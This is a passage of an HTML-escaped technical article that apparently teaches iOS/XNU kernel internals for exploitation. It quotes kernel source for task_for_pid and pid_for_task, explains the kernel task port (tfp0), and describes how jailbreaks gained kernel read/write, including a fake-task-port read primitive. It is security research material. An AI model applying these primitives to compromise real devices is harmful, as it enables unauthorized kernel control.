    &lt;span class=&quot;mi&quot;&gt;798&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfpout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;799&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;801&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_AUDIT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;802&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;803&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;804&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;805&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_for_pid_posix_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;806&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;807&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfpout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;808&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;809&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;810&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;811&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* If we aren't root and target's task access port is set... */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;812&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kauth_cred_issuser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kauth_cred_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;813&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;814&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_get_task_access_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;815&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPC_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;816&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;817&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPC_PORT_DEAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;818&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_PROTECTION_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;819&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfpout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another thing you will notice here is the check for &lt;strong&gt;pid=0&lt;/strong&gt;. This is done to prevent user specified process from accessing the send right to the kernel task port (tfp0) by specifying the pid 0. Previously, once kernel r/w was obtained, the jailbreaks used to kill this check and call &lt;strong&gt;task_for_pid(0)&lt;/strong&gt;. However, with the advent of &lt;strong&gt;KPP&lt;/strong&gt; and &lt;strong&gt;AMCC/KTRR&lt;/strong&gt;, patching wasn’t possible anymore, and hence other techniques were used but the name &lt;strong&gt;tfp0&lt;/strong&gt; still stuck and is still used to signify read and write access to kernel memory.&lt;/p&gt;

&lt;p&gt;The other API very commonly used is the &lt;strong&gt;pid_for_task()&lt;/strong&gt; Mach Trap, which is used to find the pid for the process corresponding to a given Mach Task. What it basically does is looks up the &lt;strong&gt;task&lt;/strong&gt; struct, looks up the &lt;strong&gt;bsd_info&lt;/strong&gt; field which points to the corresponding BSD &lt;strong&gt;proc&lt;/strong&gt; struct in the kernel, and reads the &lt;strong&gt;p_pid&lt;/strong&gt; value from the &lt;strong&gt;proc&lt;/strong&gt; struct. This technique has been widely used to read arbitrary kernel memory four bytes at a time (since the &lt;strong&gt;pid&lt;/strong&gt; field is 32 bits) by creating a fake task port, which is discussed later in this article.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_unix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;612&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;613&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;614&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_for_task_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;615&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;616&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;617&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;user_addr_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;pid_addr&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
    &lt;span class=&quot;mi&quot;&gt;618&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;proc_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;619&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;620&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;621&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;622&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;623&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_MACH_SYSCALL_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AUE_PIDFORTASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;624&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;625&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;626&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_name_to_task_inspect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;627&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;628&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;629&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;630&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pftout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;631&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;632&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_bsdtask_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;633&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;635&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;636&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_corpsetask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;637&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;638&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;639&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;640&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;641&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;642&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;643&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;644&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pftout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;645&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;646&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copyout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;647&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_MACH_SYSCALL_EXIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;648&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;649&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;650&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;kernel-task-port&quot;&gt;Kernel Task Port&lt;/h2&gt;

&lt;p&gt;The kernel is assigned the PID 0, and the corresponding process-less task is dubbed as the kernel task. Having a send right to the Kernel task gives you complete control of the kernel memory, it is possible to read and write into kernel memory and also inject arbitrary code by allocating memory. This is what exploits try to obtain.&lt;/p&gt;

&lt;p&gt;As discussed before, one of the earlier ways to use &lt;strong&gt;task_for_pid(0)&lt;/strong&gt; was by Patching out the check for pid 0. There was also the &lt;strong&gt;processer_set_tasks()&lt;/strong&gt; API on Mac OS that on a not secure kernel (&lt;strong&gt;#if defined SECURE_KERNEL&lt;/strong&gt;), i.e. Mac OS, returned the kernel task port as the first argument.&lt;/p&gt;

&lt;p&gt;Once the kernel task port is obtained, the following five MACH APIs are frequently used to interact with the memory. It is important to note that to execute this function successfully, the caller must have a send right to the task port of the target task. If you look at the function prototype, the first argument is the target task (&lt;strong&gt;vm_map_t target_task&lt;/strong&gt;). You can pass the kernel task port (&lt;strong&gt;mach_port_t tfp0&lt;/strong&gt;) as the first argument, and the API will gladly accept it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*Allocate a region of virtual memory in the target task starting from user specified address*/&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;nf&quot;&gt;mach_vm_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*Deallocate a region of virtual memory in the target task starting from user specified address*/&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; 
    &lt;span class=&quot;nf&quot;&gt;mach_vm_deallocate&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
